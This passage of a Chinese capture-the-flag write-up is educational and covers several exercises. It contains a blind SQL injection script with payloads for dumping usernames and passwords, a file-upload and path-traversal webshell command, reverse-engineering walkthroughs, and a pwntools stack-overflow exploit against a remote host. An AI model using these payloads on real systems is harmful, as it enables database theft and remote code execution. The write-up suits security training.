​    ClumnName=clumnName(url,tname,dataName,numClumnDict[tname],lenClumnDict[tname])

​    ClumnNameDict[tname]=ClumnName

​    print(ClumnNameDict)

 

  st = "zxcvbnmm,./';lkjhgfdsaqwertyuiop[]1234567890./*-_)(*&^%$#@!{}QWERTYUIOPLKJHGFDSAZXCVBNM"

  flag=''

  for i in range(40):

​    for s in st:

​      payload=url + " or (select mid((select value from ctf.flag limit 0,1)," + str(i + 1) + ",1)='" + s + "')--+"

​      re=requests.get(payload)

​      print(payload)

​      if key in re.text:

​        flag+=s

​        print(flag)

​        break

 

  print("数据库名称为："+dataName)

  k=0

  for i in tableNameList:

​    print("第"+str(k+1)+"张表为："+i)

​    print(i + "表中的列为：",end='')

​    print(ClumnNameDict[i])

  print("flag值为："+flag)


#库中有几个表：

#1' and ((select count(table_name) from information_schema.tables where table_schema = 'security') = 4)--+

#测表名长度：

#1' and (select length((select table_name from information_schema.tables where table_schema = 'security' limit 0,1)) = 10)--+

#爆表名：

#1' and (select mid((select table_name from information_schema.tables where table_schema = 'security' limit 0,1),1,1)='a')--+

#表中有几列：

#1' and ((select count(column_name) from information_schema.columns where table_name = 'users' and table_schema = 'security') = 3)--+

#测列名长度：

#1' and (select length((select column_name from information_schema.columns where table_name = 'users' and table_schema = 'security' limit 1,1)) = 8)--+

#爆列名:

#1' and (select mid((select column_name from information_schema.columns where table_name = 'users' and table_schema = 'security' limit 1,1),1,1)='u')--+

#爆用户名：

#1' and (select mid((select username from security.users limit 0,1),1,1)='d')--+

#爆密码：

#1' and (select mid((select password from security.users limit 0,1),1,1)='d')--+
```

### nynuupload

这道题考察的是文件上传和文件包含漏洞相结合的

首先由个上传功能 限制只能上传图片

可以上传图片马

然后图片马只有被解析成php代码才可以被执行

然后就需要文件包含这个漏洞了

文件包含相当于把另一个文件中的东西包含到本文件中

那么就相当于把图片马当中的一句话木马放进了首页当中

上传图片马会返回`uploads/2020/11/09/1326715fa921273da26372524540.png`

下边的文件包含可以看到是`?filename=1.php&submit=提交`

Filename这个参数是文件名 

如果扫描目录的话会发现

有一个include目录和uploads目录

文件包含只包含include目录里的文件 怎么包含upload里的呢？

Linux中  .. 表示上层目录

那就可以使用

`filename=../uploads/2020/11/09/1326715fa921273da26372524540.png`

使用命令读取flag

`?filename=../uploads/2020/11/09/1326715fa921273da26372524540.png&submit=提交&pass=echo%20system(%27cat flag.php%27);`

如果这里有同学可以执行phpinfo() 但是执行system没有回显  可以加上echo试试

## Reverse

### Re1

exeinfope查看文件信息，发现无壳，32位。

![re1.png](https://i.loli.net/2020/11/09/TAiagcor8bfLDvH.png)

用32位IDA，F5反编译得到伪代码。

![re2.png](https://i.loli.net/2020/11/09/TvNpDcbjqy5ro4t.png)

发现其就是将两个数组异或后，在于计数器异或。得到flag与输入比较看输入的flag是否正确。用OD比较方便直接在if判断出看V6地址处的字符串即可得到flag。

### Re2

还是exeinfope打开，发现无壳32位。

![re3.png](https://i.loli.net/2020/11/09/UAG8hHaJBEsz6pc.png)

接着F5后得到伪代码，可以看到其会将获得的输入与真正的flag比较。

![re4.png](https://i.loli.net/2020/11/09/LP1F2ziID8Jdspt.png)

还是可以直接用OD在if处查看v3处的字符串即为flag，也可以自己研究此处的指针操作得到v3处的字符串

### Re3

还是先用exeinfope打开文件，发现文件有upx壳，32位。

![re5.png](https://i.loli.net/2020/11/09/ZA4Sk1KgCM97aoQ.png)

先对其进行脱壳，用upx脱壳工具脱壳后得到脱壳后的文件。然后在用此工具查看发现无壳。

![re6.png](https://i.loli.net/2020/11/09/l13Vh9YnkxEMmZv.png)		 

接着就可以在IDA32中打开，进入main函数后F5。发现一个像是base32加密的字符串，怀疑其用了base32加密。

![re7.png](https://i.loli.net/2020/11/09/K8faTkHSdhjqUwp.png)

接着看其会做出判断，如果if成立则输入正确flag，否则错误。

![re8.png](https://i.loli.net/2020/11/09/Oksu4mJADNf9ney.png)

![re9.png](https://i.loli.net/2020/11/09/jGQTfiHFUWgLBP8.png)

接着我们需要让if判断中的条件不成立，

1. 输入字符串长度为16
2. Sub_401180函数返回1

![re10.png](https://i.loli.net/2020/11/09/aCOl6dQvmE1Fewh.png)

我们查看Sub_401180的代码（双击此函数），

![re11.png](https://i.loli.net/2020/11/09/U6ekABz4PVif7DO.png)

发现如果a1的大写变小写，小写变大写后的字符串与a2相等就能返回TRUE。

我们回到main函数中发现a2实际是字符串ww91x211C3ruB19vCgfJAW==，将其大写变小写，小写变大写后为WW91X211c3RUb19VcGFJaw==。而a1则是另一个字符串，所以只要a1等于此字符串就说明我们输入的正确的flag。

![re12.png](https://i.loli.net/2020/11/09/OQ8cKdU7EPjxlz6.png)

而a1在前面被sub_401000函数处理了，此函数以我们的输入为参数，猜测其实一个base64加密函数。进入函数发现确实是base64加密。所以我们将WW91X211c3RUb19VcGFJaw==用base64解密就是正确的flag

## Pwn

### easyStack

啊……  学弟学妹们啊  这个pwn入门的话真的挺简单的刚开始，可能就是最开始理解pwn这种解题方式有点困难，但是入门之后 我觉得比web啥的有方向感点，东西不算杂。

Ida（64位）打开二进制文件

![p1.png](https://i.loli.net/2020/11/09/TmuD4bIf3KH6Wkd.png)

可以看到使用了`fgets()`并且有一个fun函数

![p2.png](https://i.loli.net/2020/11/09/15rcVYOh7ZkfQ6K.png)

执行了`system(/bin/sh)` 这个就是后门函数了

我们需要控制主函数的返回地址让程序执行fun函数

查看fgets的参数s的栈内存

![p3.png](https://i.loli.net/2020/11/09/qmdNnfY7gkUHP1L.png)

只有0x10大小 所以填充0x10+0x8个垃圾字符 然后填充后门函数地址就可以劫持程序执行后门函数（0x8是每个程序都会有的64位是0x8  32位程序是0x4）

Exp：

```python
from pwn import *

\#sh=process('./pwnpwn')

sh=remote('39.97.170.95',8888)

 

context.log_level='debug'

sh.recvuntil("Now give me your secret :")

payload='a'*0x10+'a'*8+p64(0x4006CF)

 

sh.sendline(payload)

sh.interactive()

```
